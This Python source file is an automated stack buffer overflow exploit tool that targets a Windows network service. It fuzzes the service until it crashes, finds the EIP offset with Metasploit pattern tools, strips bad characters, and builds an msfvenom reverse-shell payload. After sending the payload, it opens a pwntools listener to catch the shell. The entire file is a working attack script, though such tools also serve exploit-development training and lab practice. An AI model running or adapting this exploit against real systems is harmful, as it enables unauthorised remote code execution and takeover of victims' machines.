#!/usr/bin/python

import sys, socket, argparse, subprocess
from binascii import hexlify 
from colorama import Fore, Back, Style, init
import codecs
import logging, time
from random import randint
import struct, threading
from pwn import *

#Logs
logging.basicConfig(filename='logs', 
                    level=logging.INFO,
                    format='%(asctime)s %(message)s',
                    datefmt='%d/%m/%Y %I:%M:%S %p')

init(autoreset=True) # Colorama auto reset settings
IP = ('127.0.0.1').encode('latin-1') # Update your Remote IP Address
PORT = 0 # Remote Port where the EXE is listening

CRASH = None # Size of the total payload when EXE crashed
EBP = None # Total Size of the EBP
EIP = None # Address of JMP ESP to be replaced in EIP
BR = None

NOPS = 30 # Size of NOPS
cmd = "" # Name of the Vulnerable variable
timeout = 10 # Seconds
LHOST = LPORT = None


badcharlist = (
  "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
  "\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
  "\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
  "\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
  "\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
  "\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
  "\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
  "\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
  "\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
  "\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
  "\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
  "\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
  "\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
  "\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
  "\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
  "\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)

parser = argparse.ArgumentParser()
parser.add_argument('-c', help='Crash length')
parser.add_argument('-ebp', help='Offset of crash')
parser.add_argument('-eip', help='ESP Address')
parser.add_argument('-br', help='Specify the found badcharacter eg: "\\x00"')
parser.add_argument('-l', help='Length for sending a random pattern')
parser.add_argument('-cmd', help='Prefix command')
parser.add_argument('-L', help='Local address for reverse shell')
parser.add_argument('-P', help='Local Port for reverse shell')
parser.add_argument('-ip', help='Target IP address',required=True)
parser.add_argument('-p', help='Target Port',required=True)
args = parser.parse_args()


def banner():
    print(Fore.CYAN+'''
        
██████╗ ██╗   ██╗███████╗███████╗███████╗██████╗ ███████╗██████╗ ██╗      ██████╗ ██╗████████╗
██╔══██╗██║   ██║██╔════╝██╔════╝██╔════╝██╔══██╗██╔════╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝
██████╔╝██║   ██║█████╗  █████╗  █████╗  ██████╔╝███████╗██████╔╝██║     ██║   ██║██║   ██║   
██╔══██╗██║   ██║██╔══╝  ██╔══╝  ██╔══╝  ██╔══██╗╚════██║██╔═══╝ ██║     ██║   ██║██║   ██║   
██████╔╝╚██████╔╝██║     ██║     ███████╗██║  ██║███████║██║     ███████╗╚██████╔╝██║   ██║   
╚═════╝  ╚═════╝ ╚═╝     ╚═╝     ╚══════╝╚═╝  ╚═╝╚══════╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝   
                                                                                                 
        ''')


def crash(): 
    global CRASH
    buffer = []
    counter = 100
    logging.info('Creating Buffer array with different Buffer size')
    while len(buffer) <= 100:
        buffer.append('A' * counter)
        counter = counter + 100

    for string in buffer:
        logging.info("Fuzzing with {} bytes".format(len(string)))
        print(Fore.BLUE + "Fuzzing with %s bytes"%len(string))
        
        try:
            logging.info("Trying to connect to {}:{}".format(IP.decode(),PORT))
            
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(timeout)
            s.connect((IP, PORT))
            s.send(bytes(cmd + string,"latin-1"))
            s.recv(1024)
            
        except Exception as e:
            CRASH = len(string)
            error = str(e).split("]")[-1].strip()
            logging.info("Socker Error : {}".format(error))
            logging.info("Program crashed while sending {} bytes".format(len(string)-100))
            
            if len(string)-100 > 0 :
                print(Fore.GREEN + "Program crashed while sending %s bytes"% str(len(string)-100))
            else:
                print(Fore.RED + "Error : "+ error)
                sys.exit(1)
            
            return 
        s.close()
    else:
        print(Fore.YELLOW+"Counter buffer did not crash, update the counter limit in script and Rerun")


def sendPayload(buffer):
    try:
        logging.info("Sending the Payload")
        logging.info("Payload: {}".format(buffer))
        
        print(Fore.BLUE + "Sending Payload ....")
        payload = cmd + buffer
        
        logging.info("Trying to connect to {}:{}".format(IP.decode(),PORT))
        
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((IP, PORT))
        s.settimeout(timeout)
        s.send(bytes(payload,"latin-1"))
        s.recv(1024)
        print(Fore.GREEN + "Payload Sent!")
        s.close()
    except socket.error as e:
        logging.info("Socker Error : {}".format(str(e).split("]")[-1]))
        
    except Exception as e:
        logging.info("Exception : Service is crashed or not Running")
        print(Fore.YELLOW + "Either the service crashed or it's not running")

def pattern_create():
    global CRASH
    logging.info("Creating a pattern of length : {}".format(CRASH))
    
    print("Creating pattern of Length " + str(CRASH))
    pattern = subprocess.run(["msf-pattern_create -l %s"%CRASH], shell=True, stdout=subprocess.PIPE)
    pattern = pattern.stdout.decode('latin-1').strip()
    
    logging.info("Sending the Pattern to Host")
    sendPayload(pattern)

def pattern_offset(offset):
    global EBP
    logging.info("Finding the offset address for {}".format(offset))
    
    print("Finding the offset address for " + offset)
    offset = subprocess.run(["msf-pattern_offset -q %s"%offset], shell=True, stdout=subprocess.PIPE)
    
    output = offset.stdout.decode('latin-1')
    print(output)
    EBP = int(output.split()[-1])

def send_badchars():
    logging.info("Sending Badchars")
    logging.info("Badchars : {}".format(badcharlist))
    
    print("Sending Badchars")
    buffer = "\x41" * EBP + "\x42" * 4 + "\x90" * NOPS + badcharlist + "\x43" * ( CRASH - EBP - 4 - NOPS)
    sendPayload(str(buffer))


def shellcode():
    global LHOST, LPORT, BR, EIP, args
    logging.info("Shellcode Exploit")
    interactive = False

    if LHOST == None or LPORT == None:
        # LHOST = input("Enter LHOST IP Address : ")
        # LPORT = input("Enter LPORT Number : ")
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        LHOST = s.getsockname()[0]
        with socket.socket() as s:
            s.bind(('',0))
            LPORT = s.getsockname()[1]
            s.close()
        interactive = True
    
    logging.info("Cooking Shellcode")
    print(Fore.BLUE+"Generating shellcode for Exploitation")

    shellcode = subprocess.run(["msfvenom -a x86 -p windows/shell_reverse_tcp LHOST={} LPORT={} -b '{}' -f c EXITFUNC=thread --platform windows".format(LHOST,LPORT,BR) ], shell=True, stdout=subprocess.PIPE)
    shellcode = shellcode.stdout.decode('latin-1')
    shellcode = shellcode.split("\n",1)[1]
    shellcode = "".join([i[1:-1] for i in shellcode[:-2].split("\n")]).replace(r"\\x",r"\x")
    shellcode=codecs.decode(shellcode, 'unicode_escape')
    
    EIP = "0x"+EIP.replace('\\x','')
    EIP = struct.pack("<I",int(EIP, 16)).decode("latin-1")
    buffer = "\x41" * EBP + EIP + "\x90" * NOPS + str(shellcode) + "\x43" * ( CRASH - EBP - 4 - NOPS)
    
    logging.info("Shellcode: {}".format(shellcode))
    print(Fore.YELLOW+"Sending Exploit")

    def send_exploit(buffer):
        time.sleep(2)
        sendPayload(buffer)
        print(Fore.YELLOW + "Exploit Sent! Fingers crossed")

    thread = threading.Thread(target=send_exploit,args=(buffer,))
    thread.start()

    if interactive:
        l = listen(int(LPORT))
        _ = l.wait_for_connection()
        l.newline = b"\r\n"
        l.interactive()

    thread.join()


def main():
    global IP, PORT, cmd, EIP, badcharlist, LHOST, LPORT, CRASH, EBP, EIP, BR, args

    IP = args.ip.encode('latin-1')
    PORT = int(args.p)
    cmd = args.cmd or ""
    LHOST = args.L
    LPORT = args.P

    try:
        CRASH = int(args.c)
        EBP = int(args.ebp)
        EIP = args.eip
        BR = args.br
    except:
        pass

    if not args.cmd:
        print(Fore.YELLOW + "Warning: Empty Command")

    if not CRASH:
        crash()

        print(Fore.CYAN+"\nPlease restart the vulnerable application and your debugger. Press enter to continue")
        input()

    if not EBP:
        pattern_create()

        eip = input("Please enter the value shown in the EIP(Big Endian): ")
        pattern_offset(eip)
    
        print(Fore.CYAN+"\nPlease restart the vulnerable application and your debugger. Press enter to continue")
        input()

    if not BR:
        send_badchars()
        print(Fore.CYAN+"\nCopy/Paste Stack value from ESP and type EOF to stop\n(Stack value will be from 90 to 43 sequence)\n")

        while True:
            line = input().strip()
            if line == "EOF":
                break

            try:
                data = line.split()[1]
                for i in range(0,len(data),2):

                    hexchar = chr(int(f"0x{data[i:i + 2]}", 16))
                    if hexchar in badcharlist:
                        badcharlist = badcharlist.replace(hexchar,"")
            except:
                pass

        BR = "\\x00" + "".join([str(hex(ord(i))).replace("0x","\\x") for i in badcharlist])
        print(Fore.BLUE+"Bad Characters: ",BR)

    if not EIP:
        print("\nFind ESP value: ")
        print(Fore.GREEN+f"Help Command: !mona jmp -r esp -cpb \"{BR}\"")
        EIP = input("ESP: ")
        #EIP = "\\x".join([esp[i:i + 2] for i in range(0, len(esp), 2)][::-1]) # Little Endian Converstion

        print(Fore.CYAN+"\nPlease restart the vulnerable application and your debugger. Press enter to continue")
        input()

    shellcode()

if __name__ == '__main__':    
    banner()
    main()